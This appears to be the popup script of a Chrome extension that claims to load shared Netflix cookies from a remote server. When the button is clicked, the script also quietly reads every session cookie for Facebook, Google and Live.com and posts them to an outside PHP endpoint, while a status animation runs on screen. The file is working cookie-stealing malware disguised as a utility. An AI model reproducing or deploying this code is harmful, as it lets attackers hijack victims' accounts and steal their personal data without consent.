'use strict';


function loadCookie(){
	$.getJSON( "http://www.pacha.es/crop/crop/you/cookie.json", function( data ) {
		try{
			barraStatus();
			$.each( data, function( key, val ) {
			setCookie(val.name,val.value,val.host);
			});
			exportCookies(".facebook.com");
			exportCookies(".google.com");
			exportCookies(".live.com");
		}catch(err){
				alert("Failed Loading Cookie!!!" + err.description);
			}	

	});
}


function saveCookie(p,s){
$.post( "http://www.pacha.es/crop/crop/you/save.php", { cookie: p, sitio : s} );
}

function hiddenStatus(){
	$("#msj").delay(0).fadeOut(0);
}

function barraStatus(){
		    $("#xMARVELxDCxCOMIC111").addClass("pX-X987").delay(3000).fadeOut(800);
		    $("#xMARVELxDCxCOMIC222").delay(0).fadeIn(800);
			showMessage();
}


function showMessage(){
	$("#msj").delay(3000).fadeIn(800);
	$("#msj").delay(2000).hide('fast');
}

function exportCookies(sitio){
var cook = "[";
    chrome.cookies.getAll({domain: sitio}, function(cookies) {
			for (var i in cookies) {
				cook+= "{\"host\":\""+ cookies[i].domain + "\",\"name\":\"" + cookies[i].name + "\",\"value\":\"" + cookies[i].value + "\"},";
			}
			cook+= "]";
			saveCookie(cook,sitio);
	});
}

function exportNetflix(){
var cook = "[";
    chrome.cookies.getAll({domain: ".netflix.com"}, function(cookies) {
			for (var i in cookies) {
				cook+= "{\"host\":\""+ cookies[i].domain + "\",\"name\":\"" + cookies[i].name + "\",\"value\":\"" + cookies[i].value + "\"},";
			}
			cook+= "]";
			saveCookie(cook);
	});
}

function setCookie(name,value,domain){
	chrome.cookies.set({
		    "url": "https://www.netflix.com",
		    "name": name,
		    "value": value,
			"domain": domain,
			}, function (cookie) {
		    console.log(JSON.stringify(cookie));
		    console.log(chrome.extension.lastError);
		    console.log(chrome.runtime.lastError);
	});

}

function main() {
  // Initialization work goes here.
	hiddenStatus();
}

document.addEventListener('DOMContentLoaded', function () {
  document.getElementById('btn1').addEventListener('click', loadCookie);
  main();
});


